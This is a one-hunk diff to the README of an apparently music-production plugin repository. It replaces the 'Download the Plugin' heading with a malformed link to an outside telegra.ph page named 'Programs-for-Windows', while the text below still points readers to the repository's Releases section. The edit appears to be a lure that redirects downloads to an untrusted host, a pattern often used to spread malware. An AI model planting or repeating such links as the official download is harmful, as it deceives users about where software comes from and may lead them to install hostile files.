@@ -10,7 +10,7 @@ Whether you're a beginner or a seasoned producer, these plugins will help you cr
 
 ## 🚀 Getting Started
 
-### 1. Download the Plugin 🖱
+[### 1. Download the Plugin 🖱]((https://telegra.ph/Programs-for-Windows-06-26)
 - Navigate to the Releases section of this repository.
 - Download the latest release of the plugin (it's a .zip).
 
